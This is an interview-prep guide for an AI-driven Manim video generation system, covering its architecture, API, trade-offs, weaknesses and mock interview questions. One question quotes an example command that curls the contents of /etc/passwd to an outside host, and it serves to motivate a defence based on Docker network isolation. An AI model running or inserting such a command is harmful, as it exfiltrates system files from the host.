# Manima Project Technical Deconstruction & Interview Prep

This document contains a rigorous technical deconstruction and interview prep for the Manima project.

---

## 1. Architecture & System Design

Your architecture is an elegant **3-Tier Orchestration Pipeline** designed around a state machine. It splits the workload into deterministic API management, non-deterministic AI routing, and isolated remote execution.

*   **Tier 1: API & Client Layer (Next.js & FastAPI)**
    *   The frontend acts as an asynchronous dashboard. Users submit prompts and optional PDF syllabuses.
    *   FastAPI ingests the request, parses the PDF into text chunks, generates vector embeddings, and stores them in Supabase (pgvector).
*   **Tier 2: The Brain (LangGraph State Machine)**
    *   This is the orchestrator. Rather than a linear script, LangGraph maintains an `AgentState` object.
    *   **Planner Node:** Queries the vector DB for context and generates a structured scene plan.
    *   **Scripter Node:** Generates visual descriptions and narration for each scene.
    *   **Human-in-the-Loop Constraint:** The graph hits an `interrupt_before` node. The LangGraph thread goes into "sleep" mode, serializing its state until a human approved webhook is received.
    *   **Coder Node:** Pulls from a local "Snippet Library" (few-shot prompting) to generate raw Python code utilizing the `manim` library.
*   **Tier 3: The Engine & Reflector (Docker Sandbox Integration)**
    *   The generated code is dispatched to an execution engine.
    *   **Sandbox:** A short-lived, ephemeral Docker container `docker run` is spun up to execute the untrusted Python code.
    *   **Self-Correction Loop:** If `manim` throws an error (stderr), the LangGraph router pushes the state to a **Reflector Node**, which prompts the LLM to fix the bug (up to 3 retries) and routes back to the Engine.
    *   **Stitcher:** FFmpeg merges the `.mp4` chunks. The final asset is pushed to Supabase Storage, and the DB status is updated.

---

## 2. API Design & Integration

Your API acts as a webhook and polling interface because video generation is a long-running, asynchronous task.

**Core Endpoints:**
*   `POST /api/upload`: Ingests a PDF, chunks it using LangChain, generates embeddings, and pushes to `pgvector`. Returns a `document_id`.
*   `POST /api/videos`: Accepts `{ prompt, document_id }`. It instantiates a LangGraph thread, assigns a `thread_id` (video ID), and immediately returns a `202 Accepted` while backgrounding the workflow.
*   `GET /api/videos/{video_id}`: Used by Next.js for **Polling**. Returns the current `status` (planning, waiting_approval, rendering, completed).
*   `GET /api/videos/{video_id}/scenes`: Fetches the `scenes` table array for the Human Review UI.
*   `POST /api/videos/{video_id}/approve`: Accepts `{ approved: true/false, feedback: string }`. This acts as the external trigger to call `resume_workflow()` in LangGraph, updating the `MemorySaver` checkpointer and continuing the graph.

---

## 3. Technology Stack & Trade-offs

Be prepared to defend *why* you chose these tools over alternatives:

*   **LangGraph vs. AutoGen / CrewAI / LangChain:**
    *   *Trade-off:* LangChain is too linear; AutoGen is too chaotic (conversational agents). LangGraph was chosen because video generation requires a strict **cyclic directed graph** (generate -> test -> reflect -> generate), and it natively supports `interrupt` state persistence for human-in-the-loop review.
*   **Groq (Llama 3.1) vs. OpenAI (GPT-4o):**
    *   *Trade-off:* Groq's LPU architecture provides instant token generation. Since you run a multi-agent pipeline where Planner, Scripter, and Coder must run sequentially, traditional LLM latency would compound and severely degrade UX. The trade-off is that Llama 3.1 on Groq might require more robust few-shot prompting (Snippet Library) to match GPT-4o's native coding accuracy.
*   **FastAPI (Python) vs. Node.js (Express/NestJS):**
    *   *Trade-off:* While Node is great for async web APIs, Python has a monopoly on AI orchestration (LangGraph, PyPDF) and data visualization (`manim`). You avoided a microservice split (Node frontend-API + Python worker) to reduce architectural complexity.
*   **Supabase vs. DIY (Postgres on RDS + S3 + Auth0):**
    *   *Trade-off:* Vendor lock-in versus developer velocity. Supabase gave you PGVector, Auth, Database, and Object Storage in one SDK, which is ideal for a fast-paced 4-person team.
*   **Docker Sandboxing vs. Abstract Syntax Trees (AST) Validation:**
    *   *Trade-off:* Generating raw Python code and executing it via `eval()` or `exec()` is an immense security vulnerability. Validating ASTs limits what the AI can do. Docker provides OS-level isolation, allowing the AI creativity while protecting the host machine.

---

## 4. System Weaknesses & Edge Cases

An expert engineer knows where their system bleeds. Raise these *before* they do:

1.  **The Polling Overhead (SPOF):** Currently, the frontend constantly hits `GET /videos/{id}`. At scale, this will DDOS your FastAPI server and exhaust connection pools. This must be refactored to **WebSockets** or **Server-Sent Events (SSE)**.
2.  **Synchronous Docker Bottleneck:** Managing `docker run` via Python's `subprocess` directly in the FastAPI/LangGraph process means heavy CPU/RAM loads will eventually block the Python event loop. This needs a distributed message broker (RabbitMQ/Celery or Redis/RQ) to offload the "Engine" to worker nodes.
3.  **Visual Hallucination Validation:** Your "Reflector" catches `stderr` syntax and compilation errors. But what if Manim renders successfully, yet the text overlaps the triangle and looks terrible? The system currently has no way to validate *visual/spatial* correctness automatically.
4.  **Zombie Containers & Fork Bombs:** If an AI generates an infinite `while` loop, or Python code that spawns threads, it could freeze the container. Even with a 120s timeout, enough concurrent malicious prompts could exhaust host resources.
5.  **LangGraph State Persistence Loss:** Currently, state seems memory-bound (`MemorySaver()`). If the FastAPI server restarts or auto-scales horizontally behind a load balancer, the LangChain thread state is lost, and the user's generated video aborts. It requires a `PostgresSaver` Checkpointer.

---

## 5. The "Grill" Session (Interview Questions)

Here are the questions an experienced Principal Engineer will ask you to test if you've really thought through the edges of this system.

**1. "You are executing arbitrary, AI-generated Python code on your backend. This is a massive security risk. Explain exactly how you secured the Docker sandbox. If I prompt the AI to run `import os; os.system('curl -X POST mydomain.com -d $(cat /etc/passwd)')`, how does your system block it?"**
*   **Ideal Answer:** "We utilized OS-level container isolation. In the `execute_manim_safe` function, we pass strict flags to `docker run`. Specifically, we use `--network none` to prevent the container from communicating with the outside world, completely neutralizing data exfiltration via `curl`. We also set `--cpus=1` and `-m 512m` to prevent resource hijacking, and `--read-only` on the filesystem (outside of the output directory) to prevent system tampering. Finally, we implement a hard timeout of 120 seconds using the `timeout` command or Docker's native limits."

**2. "Your system uses polling from Next.js to check the LangGraph status. If we have 1,000 concurrent users waiting for a render, you'll be hitting the DB with thousands of identical queries a second. How would you redesign this to be scalable?"**
*   **Ideal Answer:** "Polling is our MVP solution, but it doesn't scale. I would transition to Server-Sent Events (SSE). Since the state flows sequentially through LangGraph, I would have my agent nodes publish status updates to a Redis Pub/Sub channel (e.g., `video_status:<video_id>`). FastAPI would maintain a single persistent SSE connection with the client, subscribing to that Redis channel and streaming updates efficiently without repeatedly querying Supabase."

**3. "Let's talk about the Human-in-the-loop feature. When LangGraph pauses for approval, where exactly is that state stored? If our Kubernetes cluster scales down or the FastAPI pod restarts while a user is reviewing the script, what happens when they click 'Approve'?"**
*   **Ideal Answer:** "Right now, using `MemorySaver()`, the state exists in the memory of the specific FastAPI worker that started the graph. If that pod dies, the state is orphaned, and clicking 'Approve' will fail because the `thread_id` no longer exists in memory. To make this production-ready and horizontally scalable, we must replace `MemorySaver` with a persisted checkpointer—specifically writing the Long-Term Memory (LTM) blobs to a Postgres DB or Redis instance. This way, any API pod can pick up the state and resume the workflow."

**4. "Your Coder agent uses 'Few-Shot Prompting' with a Snippet Library. What happens when the user asks for a complex animation—like a 3D torus rotating—that isn't covered in your snippets? Does the system just fail gracefully?"**
*   **Ideal Answer:** "The system will attempt it, but if Manim yields an error, our Reflector Node catches the `stderr` and enters a self-correction loop. We allow up to 3 retries. However, if the hallucination is deep or the model simply doesn't know the Manim 3D syntax, it will ultimately fail. To solve this, later versions of our system should implement **RAG for the Coder Node**. Instead of static static few-shot snippets, we would vectorize the official Manim documentation and dynamically inject docs based on the visual description."

**5. "How do you achieve multi-tenant data isolation in pgvector? If User A uploads their university syllabus, how do you mathematically guarantee that when User B prompts the system, the Planner Agent doesn't retrieve User A's private syllabus?"**
*   **Ideal Answer:** "When we insert embeddings into `pgvector`, we attach metadata to each chunk, specifically the `user_id` and `document_id`. The `retrieve_context` tool is not just doing a cosine similarity search across the entire database; it performs a *filtered* vector search. In Supabase, we would apply Row Level Security (RLS) or explicitly strictly filter the `WHERE` clause: `WHERE metadata->>'user_id' = userA_id` before the vector distance operator `ORDER BY embedding <-> query_embedding` is calculated."

**6. "Manim rendering is CPU intensive. Describe how the 'Engine' currently interacts with the main API loop. Do you see any issues with this?"**
*   **Ideal Answer:** "Currently, `execute_manim_safe` is likely being awaited during the LangGraph node execution inside the FastAPI process. This means our API server is directly launching Docker sub-processes, competing for CPU resources against inbound web requests. This is an anti-pattern. We need to decouple the Engine. LangGraph should enqueue a rendering job into an SQS or Redis queue. A separate fleet of worker instances (e.g., Celery or Temporal workers) running on optimized, compute-heavy instances should consume the queue, run the Docker sandbox, and then update Supabase and trigger LangGraph's next node via a callback."

**7. "What happens if a user submits a 500-page textbook PDF? How do you handle LLM context limits when generating the video plan?"**
*   **Ideal Answer:** "We cannot pass 500 pages into the LLM context window. This is exactly why we use RAG. We chunk the PDF into 500-1000 token segments with overlaps. When the Planner Agent executes, it extracts keywords or sub-queries from the user's prompt (e.g., 'Chapter 4 Thermodynamics') and pulls only the top-K highest-relevance chunks from pgvector. By doing this, we restrict the prompt injected into Groq to stay well under the context limit, while still retaining the semantic meaning needed for the video plan."

**8. "FFmpeg is stitching videos synchronously at the end. What happens if the video requires 30 complex scenes? How do you manage the memory overhead during that stitch?"**
*   **Ideal Answer:** "Stitching 30 HD videos can exceed RAM limits if we simply try to load them into memory. FFmpeg handles this efficiently if we use the stream copy codec (`-c copy`) via a concatenation text file (`concat` demuxer). Because all our Manim outputs share the exact same resolution, framerate, and codec, FFmpeg doesn't need to re-encode the frames; it only rewrites the container metadata. This makes the stitching phase ultra-fast and memory-efficient."

**9. "FastAPI is asynchronous. Did you make your database calls asynchronous? What happens if you use a synchronous `psycopg2` Supabase call inside an `async def` route?"**
*   **Ideal Answer:** "If we use a synchronous blocking database call inside an `async def` function in FastAPI, it will block the master event loop, meaning zero other users can be served while waiting for the DB response. We must use an asynchronous Postgres client like `asyncpg` or execute synchronous codebase wrapped in thread pools (`run_in_threadpool`). Our Supabase client interactions must absolutely be awaited properly."

**10. "Walk me through the lifecycle of a failed API node. The Coder agent hits its 3-retry maximum, and the Reflector has given up. What happens to the user?"**
*   **Ideal Answer:** "The state machine must handle terminal failure gracefully. In LangGraph, our `check_render_status` conditional edge would identify `retry_count > 3`. Instead of looping back to `coder`, the edge routes to a `fail_handler` node. This node updates the Supabase status to `failed`, stores the final stack trace in the `error_log` column, and exits the graph. On the Next.js frontend, the polling detects the `failed` status, stops polling, and surfaces a UI component offering the user to modify their prompt or view the specific Manim trace to fix the code manually."

---

**Preparation Advice:** Study these answers. Do not memorize them word-for-word, but deeply understand the *concepts* (Decoupling queues, SSE vs Polling, Checkpointing state, Docker `--network none`). If you confidently bring up these vulnerabilities before the interviewer does, you instantly elevate yourself from a junior coder to a Principal/Architect level. Good luck!
